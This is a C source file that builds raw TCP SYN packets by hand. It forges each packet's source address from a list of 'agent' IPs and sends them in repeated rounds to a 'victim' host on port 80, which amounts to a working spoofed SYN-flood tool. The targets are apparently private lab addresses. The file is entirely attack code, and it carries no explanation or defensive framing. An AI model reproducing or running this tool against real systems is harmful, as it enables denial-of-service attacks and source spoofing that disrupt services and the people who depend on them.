#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <ctype.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <time.h>


unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum;
    unsigned short oddbyte;
    unsigned short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char*) &oddbyte) = *(unsigned char*) ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (unsigned short) ~sum;

    return answer;
}


struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
};

int main() {
    int sockfd;
    
    char *agents[] = {
        "10.0.0.2",
        "10.0.0.3",
        "10.0.0.4",
        "10.0.0.5"
    };
    char victim[] = "10.0.0.6";  
    int victim_port = 80;       
    int rounds = 100;            

    int num_agents = sizeof(agents) / sizeof(agents[0]);
    printf("Agents total: %d\n", num_agents);

   
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    
    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt IP_HDRINCL error");
        close(sockfd);
        return 1;
    }

    
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(victim_port);
    dest_addr.sin_addr.s_addr = inet_addr(victim);

    
    char datagram[4096];
    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct iphdr));

    srand(time(NULL));

    for (int r = 0; r < rounds; r++) {
        for (int i = 0; i < num_agents; i++) {
            
            memset(datagram, 0, sizeof(datagram));

            
            uint32_t src_ip = inet_addr(agents[i]);

            
            iph->ihl = 5;
            iph->version = 4;
            iph->tos = 0;
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
            iph->id = htons(rand() % 65535);
            iph->frag_off = 0;
            iph->ttl = 64;
            iph->protocol = IPPROTO_TCP;
            iph->check = 0;
            iph->saddr = src_ip;
            iph->daddr = dest_addr.sin_addr.s_addr;

            iph->check = checksum((unsigned short *) datagram,
                                  sizeof(struct iphdr));

            
            tcph->source = htons(10000 + (rand() % 50000)); 
            tcph->dest = htons(victim_port);
            tcph->seq = htonl(rand());
            tcph->ack_seq = 0;
            tcph->doff = 5;        
            tcph->fin = 0;
            tcph->syn = 1;         
            tcph->rst = 0;
            tcph->psh = 0;
            tcph->ack = 0;
            tcph->urg = 0;
            tcph->window = htons(5840); 
            tcph->check = 0;
            tcph->urg_ptr = 0;

           
            struct pseudo_header psh;
            psh.source_address = src_ip;
            psh.dest_address = dest_addr.sin_addr.s_addr;
            psh.placeholder = 0;
            psh.protocol = IPPROTO_TCP;
            psh.tcp_length = htons(sizeof(struct tcphdr));

            int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
            char *pseudogram = malloc(psize);
            if (!pseudogram) {
                perror("malloc");
                close(sockfd);
                return 1;
            }

            memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
            memcpy(pseudogram + sizeof(struct pseudo_header),
                   tcph, sizeof(struct tcphdr));

            
            tcph->check = checksum((unsigned short *) pseudogram, psize);
            free(pseudogram);

            
            if (sendto(sockfd,
                       datagram,
                       sizeof(struct iphdr) + sizeof(struct tcphdr),
                       0,
                       (struct sockaddr *) &dest_addr,
                       sizeof(dest_addr)) < 0) {
                perror("Send failed");
                close(sockfd);
                return 1;
            }

            printf("Round %d, SYN packet sent from agent %s to %s:%d\n",
                   r + 1, agents[i], victim, victim_port);
        }
    }

    close(sockfd);
    return 0;
}
